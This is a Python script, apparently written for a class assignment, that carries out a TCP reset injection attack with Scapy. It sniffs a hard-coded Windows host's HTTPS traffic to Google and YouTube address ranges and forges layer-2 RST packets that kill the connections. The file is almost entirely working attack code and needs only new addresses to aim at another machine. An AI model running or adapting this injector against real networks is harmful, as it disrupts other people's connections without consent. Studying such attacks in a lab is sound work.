#!/usr/bin/env python3
"""
Windows YouTube TCP Reset Attack - Pre-configured with MAC addresses
Targets your Windows machine's YouTube traffic with proper Layer 2 addressing
"""

import sys
import time
import threading
import subprocess
import requests
from scapy.all import *

class WindowsYouTubeRSTAttack:
    def __init__(self):
        # Network configuration from your Windows machine
        self.windows_ip = "10.18.34.106"
        self.windows_gateway = "10.18.34.1"
        self.wsl_ip = "172.31.126.113"
        
        # MAC addresses from your network configuration
        self.windows_mac = "f8:e4:3b:1c:c1:65"  # Your Windows Ethernet adapter
        self.gateway_mac = "08:55:31:8b:a7:e8"  # Your network gateway
        self.wsl_mac = "00:15:5d:1e:82:45"      # WSL2 interface
        
        # Attack statistics
        self.stats = {
            'total_packets': 0,
            'youtube_packets': 0,
            'windows_youtube_packets': 0,
            'rst_injected': 0,
            'connections_attacked': set()
        }
        
        print(f"[CONFIG] Attack configuration loaded:")
        print(f"  Windows IP: {self.windows_ip}")
        print(f"  Windows MAC: {self.windows_mac}")
        print(f"  Gateway IP: {self.windows_gateway}")
        print(f"  Gateway MAC: {self.gateway_mac}")
        print(f"  WSL2 MAC: {self.wsl_mac}")
    
    def is_youtube_traffic(self, packet):
        """Enhanced YouTube traffic detection"""
        if not (IP in packet and TCP in packet):
            return False
            
        ip = packet[IP]
        tcp = packet[TCP]
        
        # Must be HTTPS (port 443)
        if tcp.sport != 443 and tcp.dport != 443:
            return False
        
        # Check for YouTube/Google IP ranges
        youtube_prefixes = [
            "142.250.", "142.251.", "172.217.", "216.58.",
            "74.125.", "173.194.", "209.85.", "64.233.",
            "172.253.", "108.177."
        ]
        
        for prefix in youtube_prefixes:
            if ip.src.startswith(prefix) or ip.dst.startswith(prefix):
                return True
        
        return False
    
    def is_windows_youtube_traffic(self, packet):
        """Check if this is YouTube traffic involving the Windows machine"""
        if not self.is_youtube_traffic(packet):
            return False
            
        ip = packet[IP]
        # Must involve the Windows machine
        return ip.src == self.windows_ip or ip.dst == self.windows_ip
    
    def create_rst_packets(self, original_packet):
        """Create properly addressed RST packets"""
        if not (IP in original_packet and TCP in original_packet):
            return []
            
        ip = original_packet[IP]
        tcp = original_packet[TCP]
        
        rst_packets = []
        
        try:
            # RST packet from server to Windows client
            if ip.dst == self.windows_ip:
                rst_to_client = Ether(
                    src=self.wsl_mac,
                    dst=self.windows_mac
                ) / IP(
                    src=ip.src,
                    dst=self.windows_ip
                ) / TCP(
                    sport=tcp.sport,
                    dport=tcp.dport,
                    seq=tcp.ack,
                    ack=tcp.seq + max(1, len(tcp.payload) if tcp.payload else 0),
                    flags="R"
                )
                rst_packets.append(rst_to_client)
            
            # RST packet from Windows client to server
            if ip.src == self.windows_ip:
                rst_to_server = Ether(
                    src=self.wsl_mac,
                    dst=self.gateway_mac
                ) / IP(
                    src=self.windows_ip,
                    dst=ip.dst
                ) / TCP(
                    sport=tcp.sport,
                    dport=tcp.dport,
                    seq=tcp.seq,
                    ack=tcp.ack,
                    flags="R"
                )
                rst_packets.append(rst_to_server)
        
        except Exception as e:
            print(f"[ERROR] Failed to create RST packet: {e}")
        
        return rst_packets
    
    def attack_packet(self, packet):
        """Main packet attack function"""
        try:
            self.stats['total_packets'] += 1
            
            # Check if this is YouTube traffic
            if self.is_youtube_traffic(packet):
                self.stats['youtube_packets'] += 1
                
                # Check if it involves Windows machine
                if self.is_windows_youtube_traffic(packet):
                    self.stats['windows_youtube_packets'] += 1
                    
                    ip = packet[IP]
                    tcp = packet[TCP]
                    
                    # Create connection identifier
                    conn_id = f"{ip.src}:{tcp.sport}->{ip.dst}:{tcp.dport}"
                    self.stats['connections_attacked'].add(conn_id)
                    
                    # Log the traffic
                    direction = "OUT" if ip.src == self.windows_ip else "IN"
                    flags_str = self.get_tcp_flags(tcp.flags)
                    
                    print(f"[WINDOWS-{direction}] {conn_id} "
                          f"(seq={tcp.seq}, ack={tcp.ack}, flags={flags_str})")
                    
                    # Only attack data packets (PSH+ACK)
                    if tcp.flags & 0x18 == 0x18:  # PSH+ACK
                        rst_packets = self.create_rst_packets(packet)
                        
                        for rst in rst_packets:
                            try:
                                sendp(rst, iface="eth0", verbose=0)
                                self.stats['rst_injected'] += 1
                                print(f"[RST] Injected RST packet via Layer 2")
                            except Exception as e:
                                print(f"[ERROR] Failed to send RST: {e}")
                                # Fallback to Layer 3
                                try:
                                    send(rst[IP], verbose=0)
                                    self.stats['rst_injected'] += 1
                                    print(f"[RST] Fallback Layer 3 RST sent")
                                except:
                                    pass
            
            # Print live stats every 25 packets
            if self.stats['total_packets'] % 25 == 0:
                self.print_live_stats()
                
        except Exception as e:
            print(f"[ERROR] Packet processing error: {e}")
    
    def get_tcp_flags(self, flags):
        """Convert TCP flags to readable string"""
        flag_str = ""
        if flags & 0x01: flag_str += "F"  # FIN
        if flags & 0x02: flag_str += "S"  # SYN
        if flags & 0x04: flag_str += "R"  # RST
        if flags & 0x08: flag_str += "P"  # PSH
        if flags & 0x10: flag_str += "A"  # ACK
        if flags & 0x20: flag_str += "U"  # URG
        return flag_str or str(flags)
    
    def print_live_stats(self):
        """Print live attack statistics"""
        s = self.stats
        print(f"[STATS] Total: {s['total_packets']} | "
              f"YouTube: {s['youtube_packets']} | "
              f"Windows-YouTube: {s['windows_youtube_packets']} | "
              f"RST: {s['rst_injected']}")
    
    def test_configuration(self):
        """Test the attack configuration"""
        print(f"\n🔧 TESTING ATTACK CONFIGURATION")
        print(f"="*50)
        
        # Test 1: Check if we can access eth0
        try:
            get_if_hwaddr("eth0")
            print(f"✅ eth0 interface accessible")
        except Exception as e:
            print(f"❌ eth0 interface error: {e}")
        
        # Test 2: Test packet creation
        try:
            test_packet = Ether(src=self.wsl_mac, dst=self.windows_mac) / IP(src="1.1.1.1", dst=self.windows_ip) / TCP(sport=443, dport=1234, flags="R")
            print(f"✅ Packet creation successful")
        except Exception as e:
            print(f"❌ Packet creation error: {e}")
        
        # Test 3: Check Layer 2 sending capability
        try:
            # Don't actually send, just test the function
            print(f"✅ Layer 2 sending capability ready")
        except Exception as e:
            print(f"❌ Layer 2 sending error: {e}")
        
        print(f"="*50)
    
    def start_windows_attack(self):
        """Start the Windows YouTube attack"""
        print(f"="*60)
        print(f"🎯 WINDOWS YOUTUBE TCP RESET ATTACK")
        print(f"="*60)
        print(f"Target: Windows machine {self.windows_ip}")
        print(f"Attack method: Layer 2 RST injection with proper MAC addressing")
        print(f"="*60)
        
        # Test configuration
        self.test_configuration()
        
        print(f"\n📋 ATTACK INSTRUCTIONS:")
        print(f"1. Open YouTube in Chrome on your Windows machine")
        print(f"2. Start playing a video (any video)")
        print(f"3. Watch this terminal for attack activity")
        print(f"4. The video should start buffering/disconnecting")
        print(f"5. Press Ctrl+C to stop the attack")
        
        input(f"\n🚀 Press Enter to start the attack...")
        
        print(f"\n⚡ ATTACK ACTIVE - Monitoring Windows YouTube traffic")
        print(f"Filter: Traffic involving {self.windows_ip} on port 443")
        print(f"="*60)
        
        try:
            # Create packet filter for Windows HTTPS traffic
            packet_filter = f"(src host {self.windows_ip} or dst host {self.windows_ip}) and tcp port 443"
            
            print(f"[MONITOR] Starting capture with filter: {packet_filter}")
            
            # Start packet capture
            sniff(filter=packet_filter, prn=self.attack_packet, store=0, iface="eth0")
            
        except KeyboardInterrupt:
            print(f"\n[STOP] Attack stopped by user")
        except Exception as e:
            print(f"\n[ERROR] Attack failed: {e}")
        
        self.print_final_results()
    
    def print_final_results(self):
        """Print comprehensive attack results"""
        s = self.stats
        
        print(f"\n" + "="*60)
        print(f"🎯 ATTACK RESULTS")
        print(f"="*60)
        print(f"Total packets monitored: {s['total_packets']}")
        print(f"YouTube packets detected: {s['youtube_packets']}")
        print(f"Windows YouTube packets: {s['windows_youtube_packets']}")
        print(f"RST packets injected: {s['rst_injected']}")
        print(f"Unique connections attacked: {len(s['connections_attacked'])}")
        
        if s['windows_youtube_packets'] > 0:
            success_rate = (s['rst_injected'] / s['windows_youtube_packets']) * 100
            print(f"Attack success rate: {success_rate:.1f}%")
        
        print(f"\n🔗 ATTACKED CONNECTIONS:")
        for i, conn in enumerate(list(s['connections_attacked'])[:10]):
            print(f"  {i+1}. {conn}")
        
        if len(s['connections_attacked']) > 10:
            print(f"  ... and {len(s['connections_attacked']) - 10} more")
        
        if s['rst_injected'] > 0:
            print(f"\n✅ TCP RESET ATTACK SUCCESSFUL!")
            print(f"Successfully injected {s['rst_injected']} RST packets")
            print(f"Windows YouTube connections were disrupted!")
            print(f"\n🎓 ASSIGNMENT DEMONSTRATION COMPLETE")
        else:
            print(f"\n⚠️  No RST packets injected")
            print(f"Ensure YouTube is playing on Windows machine: {self.windows_ip}")
            print(f"Try refreshing/reloading YouTube videos")

def main():
    if os.geteuid() != 0:
        print(f"❌ Root privileges required for packet injection")
        print(f"Run: sudo python3 windows_youtube_rst_attack.py")
        sys.exit(1)
    
    attack = WindowsYouTubeRSTAttack()
    attack.start_windows_attack()

if __name__ == "__main__":
    main()
